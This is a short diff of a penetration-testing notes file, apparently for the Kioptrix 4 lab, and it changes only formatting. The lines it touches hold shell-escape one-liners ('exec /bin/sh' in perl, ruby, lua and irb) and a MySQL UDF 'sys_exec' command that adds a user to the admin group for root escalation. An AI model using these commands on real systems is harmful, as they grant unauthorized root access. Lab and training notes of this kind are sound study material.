@@ -57,13 +57,13 @@ perl: exec "/bin/sh";
 ruby: exec "/bin/sh"   
 lua: os.execute('/bin/sh')   
 irb(main:001:0> exec "/bin/sh"    
-lua: ``os.execute('/bin/sh')``   
-``exec "/bin/sh"``    // from IRB   
-select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.  
+lua: `os.execute('/bin/sh')`     
+`exec "/bin/sh"`     // from IRB   
+select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.    
 
-First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
-john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
--rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
+First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.   
+john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so   
+-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so  
 
 
 **== Upgrading half shells to fully interactive TTYs without closing nc session. ==**
